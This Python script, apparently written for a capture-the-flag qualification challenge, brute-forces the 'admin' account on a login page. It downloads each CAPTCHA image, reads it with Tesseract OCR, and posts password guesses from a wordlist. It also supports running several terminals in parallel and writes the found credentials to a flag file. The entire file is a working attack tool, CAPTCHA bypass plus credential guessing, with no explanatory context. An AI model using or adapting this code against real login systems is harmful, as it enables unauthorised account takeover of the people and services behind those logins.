from PIL import Image
from io import BytesIO
import cv2
import pytesseract
import requests
import base64
import sys
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

# Initialize colors
init()
print(Style.BRIGHT + "HEY YOU DON'T RUN FROM THE BRUTEFORCE!")

# Inform where is our Tesseract software to pytesseract
pytesseract.pytesseract.tesseract_cmd = "C:/Users/fox25/Desktop/python/Tesseract/tesseract.exe"

url = "http://antibf.ec2qualifications.esaip-cyber.com/login"

# This permit to have several terminals that run the script and enumerate the password in one direction and in the other.
type = True if ((int(sys.argv[1]) + 1) % 2 == 0) else False

def bruteforce():
    # Make the requests in a session
    with requests.Session() as s:
        # Read the password list
        with open('wordlist.txt', 'r') as file:
            lines = file.readlines()

            for i in range(len(lines)):
                # Filter the password
                if type: password = lines[i].replace('\n', '')
                else: password = lines[len(lines)-1-i].replace('\n', '')

                # Set the session cookies
                jar = requests.cookies.RequestsCookieJar()
                jar.set('session', '4d299fd8-871f-4b06-8086-ef26ba096ad3')

                # Scrap the logging page
                site = s.get(url, cookies=jar)

                # Parse the scrap
                soup = BeautifulSoup(site.text, 'html.parser')

                # Find the captcha
                imgcaptcha = soup.findAll('img', attrs={"class": "center-img mgb-1"})

                # Filter string to get just the base64 string
                b64 = imgcaptcha[0]['src'].replace('data:image/png;base64, ', '').encode()

                # Save the captcha into our computer
                im = Image.open(BytesIO(base64.b64decode(b64)))
                im.save('captcha%s.png' % sys.argv[1], 'PNG')

                # Load the picture
                img = cv2.imread('captcha%s.png' % sys.argv[1])


                # Recognize the text in the picture by using Tesseract
                captcha = pytesseract.image_to_string(img).replace('\n', '')

                # Post the datas and store the response (scrap the site another time)
                r = s.post(url, data={'username': 'admin', 'password': password, 'captcha': captcha}, cookies=jar)

                # Parse the response and find the response
                soup2 = BeautifulSoup(r.text, 'html.parser')
                p = soup2.findAll('p')
                msg = p[len(p)-1]

                # Check if the response is an error (wrong password/captcha) or the good password
                if p[len(p)-1].text == 'Wrong credentials !':
                    print(Fore.RED+'- %s \t(%s --> %s)' % (password, captcha, msg.text))
                elif p[len(p)-1].text == 'Wrong captcha !':
                    print(Fore.RED+'- %s \t(%s --> %s)' % (password, captcha, msg.text))
                else:
                    print(Fore.GREEN+'+ password found : %s' % (password))
                    with open('..\\flag.txt', 'w') as file:
                        file.write('\n'.join((url, 'admin', password)))
                    return True


def main():
    # Repeat the bruteforce until we got the good password
    while True:
        if bruteforce(): break

if __name__ == '__main__':
    main()